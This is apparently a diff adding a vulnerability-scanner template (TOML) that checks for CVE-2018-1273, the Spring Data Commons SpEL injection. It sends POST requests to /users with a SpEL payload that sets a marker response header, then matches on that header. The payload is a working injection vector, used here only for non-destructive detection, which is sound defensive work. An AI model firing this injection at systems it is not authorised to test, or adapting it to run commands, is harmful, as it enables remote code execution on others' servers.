@@ -1,0 +1,55 @@
+[info]
+author = "AVE"
+description = "Spring Data Commons 属性绑定器存在 SpEL 表达式注入漏洞（CVE-2018-1273），未经认证的远程攻击者可通过向 /users 等 REST 接口发送特制的请求参数触发代码执行。PoC 通过注入安全 SpEL 表达式在响应头中添加标记来验证漏洞存在，不产生破坏性影响。"
+id = "POC-AVE-2018-0198"
+name = "Spring Data Commons 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2018-1273",
+    "spring",
+    "rce",
+    "spel",
+]
+vuln_id = [
+    "CVE-2018-1273",
+    "AVE-2018-0198",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/users"
+protocol = "http"
+
+[poc.requests.body]
+content = "username[#this.getClass().forName('org.springframework.web.context.request.RequestContextHolder').getRequestAttributes().getResponse().addHeader('X-CVE-2018-1273','True')]=&password=a&repeatedPassword=a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["X-CVE-2018-1273"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/users?page=&size=5"
+protocol = "http"
+
+[poc.requests.body]
+content = "username[#this.getClass().forName('org.springframework.web.context.request.RequestContextHolder').getRequestAttributes().getResponse().addHeader('X-CVE-2018-1273','True')]=&password=a&repeatedPassword=a"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["X-CVE-2018-1273"]
